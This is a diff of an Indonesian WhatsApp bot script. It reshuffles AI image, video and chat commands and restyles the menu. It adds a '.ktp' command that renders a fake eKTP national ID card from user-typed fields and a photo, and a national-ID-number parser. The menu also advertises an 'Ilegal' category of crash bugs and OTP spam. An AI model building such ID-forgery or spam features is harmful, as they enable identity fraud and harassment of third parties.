-        await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
-
-    } catch (err) {
-        console.error('Error .aivideo:', err);
-        await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
-        await sock.sendMessage(from, {
-            text: '❌ Gagal membuat video AI.'
-        }, { quoted: msg });
-    }
-
-    return;
-}
-
-
-if (text.toLowerCase().startsWith('.aigambar')) {
-    const prompt = text.replace(/\.aigambar/i, '').trim();
-
-       if (!isOwner(sender) && !isVIP(sender)) {
-        await sock.sendMessage(from, { 
-            text: '❌ Fitur *.aigambar* hanya untuk *VIP* dan *Owner*!' 
-        }, { quoted: msg });
-        await sock.sendMessage(from, { react: { text: '🔒', key: msg.key } });
-        return;
-    }
-
-    if (!prompt) {
-        return sock.sendMessage(from, {
-            text: '❌ Contoh: *.aigambar kucing oren lucu pakai topi*'
-        }, { quoted: msg });
-    }
-
-    // React loading
-    await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
-
-    try {
-        const apiKey = 'free'; // ganti kalau ada key premium
-        const apiURL = `https://www.rissxd.biz.id/api/ai/deepaiimage?keyze=${apiKey}&text=${encodeURIComponent(prompt)}`;
-
-        const res = await fetch(apiURL);
-        if (!res.ok) throw new Error('Gagal generate gambar AI');
-
-        // Ambil langsung sebagai buffer, karena ini gambar mentah
-        const arrayBuf = await res.arrayBuffer();
-        const buffer = Buffer.from(arrayBuf);
-
-        await sock.sendMessage(from, {
-            image: buffer,
-            caption: `🎨 *AI Gambar*\n\n📝 Prompt:\n${prompt}`
-        }, { quoted: msg });
-
-        // React sukses
-        await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
-
-    } catch (err) {
-        console.error('Error .aigambar:', err);
-
-        await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
-        await sock.sendMessage(from, {
-            text: '❌ Gagal membuat gambar AI.'
-        }, { quoted: msg });
-    }
-
-    return;
-}
 
 if (text.trim() === '.tebaklagu') {
     await sock.sendMessage(from, { react: { text: '🎵', key: msg.key } });
@@ -12005,76 +12218,6 @@ if (text.trim().toLowerCase().startsWith('.tiktokstalk')) {
     return;
 }
 
-if (text.trim().toLowerCase() === '.hitamkan') {
-    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
-    const imageDirect = msg.message?.imageMessage;
-    const imageQuoted = quoted?.imageMessage;
-
-    let targetMsg = null;
-    if (imageDirect) targetMsg = msg;
-    else if (imageQuoted) targetMsg = { ...msg, message: { imageMessage: imageQuoted } };
-
-    if (!targetMsg) {
-        return sock.sendMessage(
-            from,
-            { text: '❌ Kirim atau reply foto dengan caption *.hitamkan*' },
-            { quoted: msg }
-        );
-    }
-
-    try {
-        // React loading
-        await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
-
-        // Download gambar
-        const buffer = await downloadMediaMessage(
-            targetMsg,
-            'buffer',
-            {},
-            { logger: console }
-        );
-
-        // Upload ke hosting (Catbox) supaya dapat URL
-        const imageUrl = await uploadToCatbox(buffer);
-
-        // Panggil API Hitamkan
-        const apiKey = 'free'; // ganti keyze-mu kalau ada
-        const api = `https://www.rissxd.biz.id/api/ai/hytamkan?keyze=${apiKey}&url=${encodeURIComponent(imageUrl)}`;
-        const res = await fetch(api);
-        if (!res.ok) throw new Error('API hitamkan gagal');
-
-        const json = await res.json();
-        if (!json?.status || !json?.result?.url) throw new Error('API hitamkan tidak mengembalikan gambar');
-
-        // Ambil gambar hasil hitamkan
-        const resultRes = await fetch(json.result.url);
-        const resultBuffer = Buffer.from(await resultRes.arrayBuffer());
-
-        // Kirim hasil ke WA
-        await sock.sendMessage(
-            from,
-            {
-                image: resultBuffer,
-                caption: `🖤 *Hitamkan Berhasil!*`
-            },
-            { quoted: msg }
-        );
-
-        // React sukses
-        await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
-
-    } catch (err) {
-        console.error('❌ Error .hitamkan:', err);
-        await sock.sendMessage(
-            from,
-            { text: '❌ Gagal memproses gambar.' },
-            { quoted: msg }
-        );
-    }
-
-    return;
-}
-
 
 
 if (text.trim().toLowerCase() === '.hapusbg' || text.trim().toLowerCase().startsWith('.hapusbg ')) {
@@ -12253,98 +12396,6 @@ if (text.trim().toLowerCase() === '.hd' || text.trim().toLowerCase().startsWith(
         await sock.sendMessage(
             from,
             { text: `❌ Gagal enhance gambar: ${err.message || 'Coba lagi nanti ya'}` },
-            { quoted: msg }
-        );
-        await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
-    }
-
-    return;
-}
-
-if (
-    text.trim().toLowerCase() === '.tofigure' ||
-    text.trim().toLowerCase().startsWith('.tofigure ')
-) {
-    // Khusus VIP & Owner
-    if (!isOwner(sender) && !isVIP(sender)) {
-        await sock.sendMessage(from, { 
-            text: '❌ Fitur *.tofigure* hanya untuk *VIP* dan *Owner*' 
-        }, { quoted: msg });
-        await sock.sendMessage(from, { react: { text: '🔒', key: msg.key } });
-        return;
-    }
-
-    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
-    const imageDirect = msg.message?.imageMessage;
-    const imageQuoted = quoted?.imageMessage;
-
-    let targetMsg = null;
-    if (imageDirect) targetMsg = msg;
-    else if (imageQuoted) targetMsg = { ...msg, message: { imageMessage: imageQuoted } };
-
-    if (!targetMsg) {
-        return sock.sendMessage(
-            from,
-            { text: '❌ Kirim atau reply foto dengan caption *.tofigure*' },
-            { quoted: msg }
-        );
-    }
-
-    try {
-        // React loading
-        await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
-
-        // Download gambar dari WA
-        const buffer = await downloadMediaMessage(
-            targetMsg,
-            'buffer',
-            {},
-            { logger: console }
-        );
-
-        // Upload ke Catbox (buat dapet URL publik)
-        const imageUrl = await uploadToCatbox(buffer); // fungsi sama kayak .hapusbg
-
-        // API KEY
-        const apiKey = 'free'; // ganti pake key lu
-        const apiUrl = `https://www.rissxd.biz.id/api/ai/tofigure?keyze=${apiKey}&url=${encodeURIComponent(imageUrl)}`;
-
-        // Panggil API
-        const res = await fetch(apiUrl);
-        if (!res.ok) {
-            throw new Error(`API error: ${res.status} - ${res.statusText}`);
-        }
-
-        const json = await res.json();
-
-        if (!json?.status || !json?.result?.url) {
-            throw new Error('API gagal mengembalikan hasil gambar');
-        }
-
-        // Download hasil figurine
-        const resultRes = await fetch(json.result.url);
-        if (!resultRes.ok) throw new Error('Gagal download hasil dari API');
-
-        const resultBuffer = Buffer.from(await resultRes.arrayBuffer());
-
-        // Kirim hasil
-        await sock.sendMessage(
-            from,
-            {
-                image: resultBuffer,
-                caption: `✨ *To Figure Berhasil!*`
-            },
-            { quoted: msg }
-        );
-
-        // React sukses
-        await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
-
-    } catch (err) {
-        console.error('❌ Error .tofigure:', err.message || err);
-        await sock.sendMessage(
-            from,
-            { text: `❌ Gagal membuat figurine: ${err.message || 'Coba lagi nanti ya'}` },
             { quoted: msg }
         );
         await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
@@ -13301,7 +13352,9 @@ if (text.toLowerCase() === '.listpanel' && isOwner(sender)) {
     }
     
     return;
-}// ============ FITUR: .panelinfo <userid/username> ============
+}
+
+// ============ FITUR: .panelinfo <userid/username> ============
 if (text.toLowerCase().startsWith('.panelinfo')) {
     const args = text.trim().split(/\s+/);
     const target = args[1];
@@ -13309,7 +13362,7 @@ if (text.toLowerCase().startsWith('.panelinfo')) {
 
     if (!isOwner(userJid) && !isVIP(userJid)) {
         await sock.sendMessage(from, {
-            text: '❌ Fitur ini hanya untuk Owner/Admin/VIP!'
+            text: '❌ Fitur ini hanya untuk Owner/VIP!'
         }, { quoted: msg });
         return;
     }
@@ -13447,7 +13500,343 @@ if (text.toLowerCase().startsWith('.panelinfo')) {
     return;
 }
 
+// ========== FITUR .KTP ==========
+if (text.trim().toLowerCase() === '.ktp') {
+    return sock.sendMessage(from, {
+        text: `*FORMAT BUAT eKTP*
 
+Reply/kirim foto lalu isi seperti ini:
+
+.ktp
+provinsi: 
+kota: 
+nik: 
+nama: 
+ttl: 
+jk: 
+goldar: 
+alamat: 
+rt/rw: 
+kel: 
+kec: 
+agama: 
+status: 
+pekerjaan: 
+kewarganegaraan: 
+masa_berlaku: 
+terbuat: `
+    }, { quoted: msg });
+}
+
+if (text.trim().toLowerCase().startsWith('.ktp')) {
+
+     // Validasi Owner / VIP
+    if (!isOwner(sender) && !isVIP(sender)) {
+        await sock.sendMessage(from, { text: '❌ Hanya Owner atau VIP yang bisa membuat KTP.' }, { quoted: msg });
+        return;
+    }
+
+    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+    const imageDirect = msg.message?.imageMessage;
+    const imageQuoted = quoted?.imageMessage;
+
+    let targetMsg = null;
+    if (imageDirect) targetMsg = msg;
+    else if (imageQuoted) targetMsg = { ...msg, message: { imageMessage: imageQuoted } };
+
+    if (!targetMsg) {
+        return sock.sendMessage(from, {
+            text: "❌ Kirim / reply foto dengan format .ktp"
+        }, { quoted: msg });
+    }
+
+    const bodyText = text.replace('.ktp', '').trim();
+
+    function getValue(key) {
+        const regex = new RegExp(`${key}\\s*:\\s*(.*)`, 'i');
+        const match = bodyText.match(regex);
+        return match ? match[1].trim() : '';
+    }
+
+    const provinsi = getValue('provinsi');
+    const kota = getValue('kota');
+    const nik = getValue('nik');
+    const nama = getValue('nama');
+    const ttl = getValue('ttl');
+    const jk = getValue('jk');
+    const goldar = getValue('goldar');
+    const alamat = getValue('alamat');
+    const rtrw = getValue('rt/rw');
+    const kel = getValue('kel');
+    const kec = getValue('kec');
+    const agama = getValue('agama');
+    const status = getValue('status');
+    const pekerjaan = getValue('pekerjaan');
+    const kewarganegaraan = getValue('kewarganegaraan');
+    const masa_berlaku = getValue('masa_berlaku');
+    const terbuat = getValue('terbuat');
+
+    // Validasi minimal
+    if (!provinsi || !kota || !nik || !nama) {
+        return sock.sendMessage(from, {
+            text: "❌ Data wajib (provinsi, kota, nik, nama) belum diisi!"
+        }, { quoted: msg });
+    }
+
+    try {
+        await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
+
+        const buffer = await downloadMediaMessage(
+            targetMsg,
+            'buffer',
+            {},
+            { logger: console }
+        );
+
+        // Upload ke Catbox (pakai function uploadToCatbox kamu)
+        const imageUrl = await uploadToCatbox(buffer);
+
+        const api = `https://api.siputzx.my.id/api/canvas/ektp?` +
+            `provinsi=${encodeURIComponent(provinsi)}` +
+            `&kota=${encodeURIComponent(kota)}` +
+            `&nik=${encodeURIComponent(nik)}` +
+            `&nama=${encodeURIComponent(nama)}` +
+            `&ttl=${encodeURIComponent(ttl)}` +
+            `&jenis_kelamin=${encodeURIComponent(jk)}` +
+            `&golongan_darah=${encodeURIComponent(goldar)}` +
+            `&alamat=${encodeURIComponent(alamat)}` +
+            `&rt%2Frw=${encodeURIComponent(rtrw)}` +
+            `&kel%2Fdesa=${encodeURIComponent(kel)}` +
+            `&kecamatan=${encodeURIComponent(kec)}` +
+            `&agama=${encodeURIComponent(agama)}` +
+            `&status=${encodeURIComponent(status)}` +
+            `&pekerjaan=${encodeURIComponent(pekerjaan)}` +
+            `&kewarganegaraan=${encodeURIComponent(kewarganegaraan)}` +
+            `&masa_berlaku=${encodeURIComponent(masa_berlaku)}` +
+            `&terbuat=${encodeURIComponent(terbuat)}` +
+            `&pas_photo=${encodeURIComponent(imageUrl)}`;
+
+        const res = await fetch(api);
+        if (!res.ok) throw new Error("API eKTP gagal");
+
+        const resultBuffer = Buffer.from(await res.arrayBuffer());
+
+        await sock.sendMessage(from, {
+            image: resultBuffer,
+            caption: "KTP berhasil dibuat!"
+        }, { quoted: msg });
+
+        await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
+
+    } catch (err) {
+        console.error("❌ Error .ktp:", err);
+        await sock.sendMessage(from, {
+            text: "❌ Gagal membuat eKTP."
+        }, { quoted: msg });
+    }
+
+    return;
+}
+
+
+if (text.startsWith('.ceknik')) {
+    const nik = text.replace('.ceknik', '').trim();
+
+    if (!nik) {
+        return sock.sendMessage(from, {
+            text: "❌ Masukkan NIK.\nContoh:\n.ceknik 3324075510730002"
+        }, { quoted: msg });
+    }
+
+    try {
+
+        console.log("========== CEKNIK START ==========");
+        console.log("Input NIK:", nik);
+
+        // =============================
+        // VALIDASI DASAR
+        // =============================
+        if (!/^\d{16}$/.test(nik)) {
+            return sock.sendMessage(from, {
+                text: "❌ NIK harus 16 digit angka."
+            }, { quoted: msg });
+        }
+
+        // =============================
+        // 🌐 TRY ONLINE API (UTAMA)
+        // =============================
+        try {
+
+            console.log("🌐 Mencoba CEKNIK Online API");
+
+            const res = await fetch(`https://nik-parser.p.rapidapi.com/ektp?nik=${nik}`, {
+                method: "GET",
+                headers: {
+                    "x-rapidapi-host": "nik-parser.p.rapidapi.com",
+                    "x-rapidapi-key": process.env.RAPIDAPI_KEY
+                }
+            });
+
+            const result = await res.json();
+
+            if (result && result.errCode === 0 && result.data) {
+
+                const d = result.data;
+
+                const teks = `
+ 📌 *HASIL CEK NIK*
+
+ 🆔 NIK        : ${nik}
+ 📍 Provinsi   : ${d.province || "-"}
+ 🏙️ Kab/Kota   : ${d.city || "-"}
+ 🏘️ Kecamatan  : ${d.district || "-"}
+ 📮 Kode Pos   : ${d.zipcode || "-"}
+ 👤 Gender     : ${d.gender || "-"}
+ 🎂 Lahir      : ${d.birthdate || "-"}
+ 🔢 Kode Unik  : ${d.uniqcode || "-"}
+                `;
+
+                console.log("✅ CEKNIK ONLINE BERHASIL");
+                await sock.sendMessage(from, { text: teks }, { quoted: msg });
+
+                console.log("========== CEKNIK END ==========");
+                return;
+            }
+
+            console.log("⚠️ API tidak memberikan data valid, fallback offline");
+
+        } catch (apiErr) {
+            console.log("⚠️ CEKNIK ONLINE ERROR, fallback offline");
+        }
+
+        // =============================
+        // 🧠 FALLBACK OFFLINE PARSER
+        // =============================
+        console.log("🧠 Menjalankan parser offline");
+
+        const { nikParser } = require('nik-parser');
+        const resultOffline = nikParser(nik);
+
+        let provinsi = "-";
+        let kabkota = "-";
+        let kecamatan = "-";
+        let kodepos = "-";
+        let uniq = "-";
+        let gender = "-";
+        let tanggalFormat = "-";
+        let umur = "-";
+
+        try { provinsi = resultOffline.province(); } catch {}
+        try { kabkota = resultOffline.kabupatenKota(); } catch {}
+        try { kecamatan = resultOffline.kecamatan(); } catch {}
+        try { kodepos = resultOffline.kodepos(); } catch {}
+        try { uniq = resultOffline.uniqcode(); } catch {}
+
+        // Parsing manual tanggal dari NIK
+        try {
+
+            let tanggalRaw = parseInt(nik.substring(6, 8));
+            let bulan = parseInt(nik.substring(8, 10));
+            let tahun = parseInt(nik.substring(10, 12));
+
+            if (tanggalRaw > 40) {
+                gender = "Perempuan";
+                tanggalRaw -= 40;
+            } else {
+                gender = "Laki-laki";
+            }
+
+            const tahunSekarang2Digit = new Date().getFullYear() % 100;
+            tahun += tahun <= tahunSekarang2Digit ? 2000 : 1900;
+
+            const bulanIndo = [
+                "Januari","Februari","Maret","April","Mei","Juni",
+                "Juli","Agustus","September","Oktober","November","Desember"
+            ];
+
+            tanggalFormat = `${tanggalRaw} ${bulanIndo[bulan - 1]} ${tahun}`;
+
+            const today = new Date();
+            umur = today.getFullYear() - tahun;
+
+            if (
+                today.getMonth() < (bulan - 1) ||
+                (today.getMonth() === (bulan - 1) && today.getDate() < tanggalRaw)
+            ) {
+                umur--;
+            }
+
+        } catch {}
+
+        const teksOffline = `
+ 📌 *HASIL CEK NIK* 
+
+ 🆔 NIK        : ${nik}
+ 📍 Provinsi   : ${provinsi}
+ 🏙️ Kab/Kota   : ${kabkota}
+ 🏘️ Kecamatan  : ${kecamatan}
+ 📮 Kode Pos   : ${kodepos}
+ 👤 Gender     : ${gender}
+ 🎂 Lahir      : ${tanggalFormat}
+ 📅 Umur       : ${umur} Tahun
+ 🔢 Kode Unik  : ${uniq}
+        `;
+
+        console.log("✅ CEKNIK OFFLINE BERHASIL");
+        await sock.sendMessage(from, { text: teksOffline }, { quoted: msg });
+
+        console.log("========== CEKNIK END ==========");
+
+    } catch (err) {
+        console.error("💀 ERROR CEKNIK FATAL:", err);
+
+        sock.sendMessage(from, {
+            text: "❌ Terjadi kesalahan saat memproses NIK."
+        }, { quoted: msg });
+    }
+}
+
+// ========== FITUR .SERTIFTOLol ==========
+if (text.trim().toLowerCase().startsWith('.sertiftolol')) {
+
+    const inputText = text.replace('.sertiftolol', '').trim();
+
+    if (!inputText) {
+        return sock.sendMessage(from, {
+            text: "❌ Masukkan teks.\n\nContoh:\n.sertiftolol Fajar Anak Rajin"
+        }, { quoted: msg });
+    }
+
+    try {
+        await sock.sendMessage(from, { 
+            react: { text: '⏳', key: msg.key } 
+        });
+
+        const api = `https://api.siputzx.my.id/api/canvas/sertifikat-tolol?text=${encodeURIComponent(inputText)}`;
+
+        const res = await fetch(api);
+        if (!res.ok) throw new Error("API gagal");
+
+        const buffer = Buffer.from(await res.arrayBuffer());
+
+        await sock.sendMessage(from, {
+            image: buffer,
+            caption: "Sertifikat berhasil dibuat!"
+        }, { quoted: msg });
+
+        await sock.sendMessage(from, { 
+            react: { text: '✅', key: msg.key } 
+        });
+
+    } catch (err) {
+        console.error("❌ Error .sertiftolol:", err);
+        await sock.sendMessage(from, {
+            text: "❌ Gagal membuat sertifikat."
+        }, { quoted: msg });
+    }
+
+    return;
+}
 
 if (text.trim() === '.menu') {
     await sock.sendMessage(from, {
@@ -13455,37 +13844,39 @@ if (text.trim() === '.menu') {
     });
 
     // Sections menu - NORMAL FONT
-    const sections = [
-        {
-            title: "✨ Pilihan Utama",
-            highlight_label: "⭐ Rekomendasi",
-            rows: [
-                { title: "🌟 Menu All", id: "menu_all", description: "Akses lengkap semua fitur dalam satu tempat" }
-            ]
-        },
-        {
-            title: "🎮 Kategori Fitur",
-            highlight_label: "Exclusive Collection",
-            rows: [
-                { title: "💀 Menu Ilegal", id: "menu_ilegal", description: "Bug crash, spamotp, spamcode" },
-                { title: "🎲 Menu Game", id: "menu_game", description: "Game seru & kompetitif untuk hiburan" },
-                { title: "😂 Menu Fun", id: "menu_lucu", description: "Jokes, meme, & hiburan" },
-                { title: "🧠 Menu AI", id: "menu_ai", description: "AI Quantumx - Assisten" },
-                { title: "🎵 Menu Music & Downloader", id: "menu_music", description: "Download lagu, youtube, tiktok, spotify" },
-                { title: "🖼️ Menu Maker / Creator", id: "menu_maker", description: "Buat stiker, meme, & emoji" },
-                { title: "📸 Menu Media", id: "menu_media", description: "Tools edit foto, video, & dokumen" },
-                { title: "🕵️ Menu Anonymous", id: "menu_anon", description: "Chat rahasia tanpa ketahuan identitas" },
-                { title: "⚙️ Menu Group", id: "menu_group", description: "Kelola grup: tag, polling, antistiker, dll" },
-                { title: "🏆 Menu Skor Game", id: "menu_skor", description: "Leaderboard, skor, exp, level" },
-                { title: "ℹ️ Menu Info", id: "menu_info", description: "Info bot, uptime, & status server" },
-                { title: "👑 Menu VIP Control", id: "menu_vipcontrol", description: "Kontrol fitur VIP" },
-                { title: "🚀 Menu Panel", id: "menu_panel", description: "Perintah Administrasi Panel Pterodactyl" },
-                { title: "🔐 Menu Owner", id: "menu_owner", description: "Perintah khusus owner" }
-               
-            ]
-        }
-    ];
-
+   const sections = [
+    {
+        title: "UTAMA",
+        highlight_label: "RECOMMENDED",
+        rows: [
+            {
+                title: "All Menu",
+                id: "menu_all",
+                description: "Akses semua fitur dalam satu tampilan"
+            }
+        ]
+    },
+    {
+        title: "FITUR",
+        highlight_label: "EKSKLUSIF",
+        rows: [
+            { title: "Ilegal", id: "menu_ilegal", description: "Fitur bug & spam" },
+            { title: "Game", id: "menu_game", description: "Mini games & hiburan" },
+            { title: "Fun", id: "menu_lucu", description: "Jokes & konten santai" },
+            { title: "AI", id: "menu_ai", description: "Asisten AI Quantumx" },
+            { title: "Downloader", id: "menu_music", description: "YouTube, TikTok, Spotify" },
+            { title: "Creator", id: "menu_maker", description: "Stiker & konten kreatif" },
+            { title: "Media", id: "menu_media", description: "Edit foto, video, PDF" },
+            { title: "Anonymous", id: "menu_anon", description: "Chat anonim" },
+            { title: "Group", id: "menu_group", description: "Manajemen grup" },
+            { title: "Score", id: "menu_skor", description: "Level & leaderboard" },
+            { title: "Info", id: "menu_info", description: "Informasi bot & server" },
+            { title: "VIP", id: "menu_vipcontrol", description: "Fitur khusus VIP" },
+            { title: "Panel", id: "menu_panel", description: "Panel Pterodactyl" },
+            { title: "Owner", id: "menu_owner", description: "Akses khusus owner" }
+        ]
+    }
+];
     // Random GIF
     const gifs = [
         'https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWpkdWZqZnU4am5hcjl0OGJoMXM4N2Eydm9kOXdzODNnanczNnVtdyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/a0Ixcxsv3xBvXl0vj6/giphy.mp4',
@@ -13552,6 +13943,15 @@ if (text.trim() === '.menu') {
                 {
                     name: "quick_reply",
                     buttonParamsJson: JSON.stringify({ display_text: "Developer", id: "kontak_developer" })
+                },
+                // ========== BUTTON CHANNEL TIKTOK ==========
+                {
+                    name: "cta_url",
+                    buttonParamsJson: JSON.stringify({
+                        display_text: "Tiktok",
+                        url: "https://www.tiktok.com/@themoonp?_r=1&_t=ZS-94Jij6adNLM",
+                        merchant_url: "https://www.tiktok.com/@themoonp?_r=1&_t=ZS-94Jij6adNLM"
+                    })
                 }
             ]
         }),
@@ -13578,6 +13978,98 @@ if (text.trim() === '.menu') {
     return;
 }
 
+// ================== COMMAND .quantumx (AI CHAT) ==================
+if (text.startsWith('.quantumx')) {
+    const isi = text.replace(/^\.quantumx/i, '').trim();
+    if (!isi) {
+        await sock.sendMessage(from, { 
+            text: "❗ Contoh: *.quantumx halo bot*" 
+        });
+        return;
+    }
+
+    const idLimit = from.endsWith("@g.us") ? from : sender;
+    initDefaultAiLimit(idLimit);
+
+    if (!cekLimitAI(idLimit) && !isOwner(sender)) {
+        await sock.sendMessage(from, { 
+            text: "❌ *AI Response Error:*\n*Quota Exceeded — User daily limit reached.*" 
+        });
+        return;
+    }
+
+    const balasan = await getAIReply(sender, isi, from);
+    await sock.sendMessage(from, { text: balasan });
+
+    tambahPakaiAI(idLimit);
+    return;
+}
+
+// ================== COMMAND .aivideo ==================
+if (text.toLowerCase().startsWith('.aivideo')) {
+    const args = text.replace(/\.aivideo/i, '').trim().split(' ');
+
+    if (!isOwner(sender) && !isVIP(sender)) {
+        await sock.sendMessage(from, { 
+            text: '❌ Fitur *.aivideo* hanya untuk *VIP* dan *Owner*!' 
+        }, { quoted: msg });
+        await sock.sendMessage(from, { react: { text: '🔒', key: msg.key } });
+        return;
+    }
+    
+    if (args.length < 2) {
+        return sock.sendMessage(from, {
+            text: '❌ Contoh: *.aivideo kucing main bola 9:16*\n⚠️ Resolusi wajib: 9:16 atau 16:9'
+        }, { quoted: msg });
+    }
+
+    const ratio = args[args.length - 1];
+    const prompt = args.slice(0, -1).join(' ');
+
+    if (!['9:16', '16:9'].includes(ratio)) {
+        return sock.sendMessage(from, {
+            text: '❌ Resolusi tidak valid! Pilih *9:16* atau *16:9*'
+        }, { quoted: msg });
+    }
+
+    if (!prompt) {
+        return sock.sendMessage(from, {
+            text: '❌ Prompt tidak boleh kosong.'
+        }, { quoted: msg });
+    }
+
+    await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
+
+    try {
+        const apiKey = 'freeApikey';
+        const apiURL = `https://anabot.my.id/api/ai/text2video?prompt=${encodeURIComponent(prompt)}&quality=720p&ratio=${encodeURIComponent(ratio)}&apikey=${encodeURIComponent(apiKey)}`;
+        
+        const res = await fetch(apiURL);
+        if (!res.ok) throw new Error('Gagal generate video AI');
+
+        const data = await res.json();
+        if (!data.success || !data.data?.result) throw new Error('API tidak mengembalikan video');
+
+        const videoURL = data.data.result;
+
+        await sock.sendMessage(from, {
+            video: { url: videoURL },
+            caption: `🎬 *AI Video*\n\n📝 Prompt:\n${prompt}\n📏 Resolusi: ${ratio}`
+        }, { quoted: msg });
+
+        await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });
+
+    } catch (err) {
+        console.error('Error .aivideo:', err);
+        await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
+        await sock.sendMessage(from, {
+            text: '❌ Gagal membuat video AI.'
+        }, { quoted: msg });
+    }
+    return;
+}
+
+// ================== COMMAND .ailimit ==================
 if (text.startsWith(".ailimit")) {
     if (!isOwner(sender)) {
         await sock.sendMessage(from, { text: "❌ Khusus owner." });
@@ -13586,7 +14078,7 @@ if (text.startsWith(".ailimit")) {
 
     const args = text.split(" ");
 
-    // === MODE 1: set limit nomor (private only) ===
+    // MODE 1: set limit nomor (private only)
     if (args.length === 3 && !from.endsWith("@g.us")) {
         const nomor = args[1];
         const jumlah = parseInt(args[2]);
@@ -13605,7 +14097,7 @@ if (text.startsWith(".ailimit")) {
         return;
     }
 
-    // === MODE 2: pilih grup ===
+    // MODE 2: pilih grup
     if (args.length === 2 && !from.endsWith("@g.us")) {
         const jumlah = parseInt(args[1]);
         if (isNaN(jumlah)) {
@@ -13613,7 +14105,6 @@ if (text.startsWith(".ailimit")) {
             return;
         }
 
-        // ambil semua grup
         let daftarGrup = Object.keys(await sock.groupFetchAllParticipating());
 
         let teks = `📋 *Pilih grup untuk set limit AI (${jumlah} chat)*:\n\n`;
@@ -13636,6 +14127,7 @@ if (text.startsWith(".ailimit")) {
     return;
 }
 
+// ================== HANDLER SESI PILIH GRUP ==================
 if (sesiLimitAI.has(sender)) {
     const data = sesiLimitAI.get(sender);
     const pilih = parseInt(text.trim());
@@ -13654,39 +14146,11 @@ if (sesiLimitAI.has(sender)) {
     await sock.sendMessage(from, { text: `✅ Limit AI untuk grup ini diatur menjadi *${data.jumlah} chat*.` });
     return;
 }
-// 🔥 AI CHAT COMMAND (ANTI NABRAK)
-if (/^\.ai(\s|$)/i.test(text)) {
-    const isi = text.replace(/^\.ai/i, '').trim();
-    if (!isi) {
-        await sock.sendMessage(from, { 
-            text: "❗ Contoh: *.ai halo bot*" 
-        });
-        return;
-    }
 
-    const idLimit = from.endsWith("@g.us") ? from : sender;
-    initDefaultAiLimit(idLimit);
-
-    if (!cekLimitAI(idLimit) && !isOwner(sender)) {
-        await sock.sendMessage(from, { 
-            text: "❌ *AI Response Error:*\n*Quota Exceeded — User daily limit reached.*" 
-        });
-        return;
-    }
-
-    const balasan = await getAIReply(sender, isi, from);
-    await sock.sendMessage(from, { text: balasan });
-
-    tambahPakaiAI(idLimit);
-    return;
-}
-
+// ================== COMMAND .ceklimit ==================
 if (text === '.ceklimit') {
-
-    // ID limit: grup atau private
     const idLimit = from.endsWith('@g.us') ? from : sender;
 
-    // auto init kalau belum ada
     initDefaultAiLimit(idLimit);
 
     const data = aiLimit[idLimit];
@@ -13712,7 +14176,6 @@ ${lokasi}
 📉 Terpakai   : *${data.used}*
 ✅ Sisa       : *${sisa}*`;
 
-    // info tambahan kalau habis
     if (sisa <= 0) {
         teks += `\n\n⚠️ *Limit AI sudah habis*\nHubungi owner untuk isi ulang.`;
     }
@@ -13721,16 +14184,13 @@ ${lokasi}
     return;
 }
 
-
-// 🔥 MODIFIED .clear COMMAND - PAKAI from
+// ================== COMMAND .clear ==================
 if (text === ".clear") {
     const memoryId = from.endsWith("@g.us") ? from : sender;
     resetChatMemory(memoryId);
     await sock.sendMessage(from, { text: "🧹 Obrolan AI berhasil direset!" });
     return;
 }
-
-
 
 
 
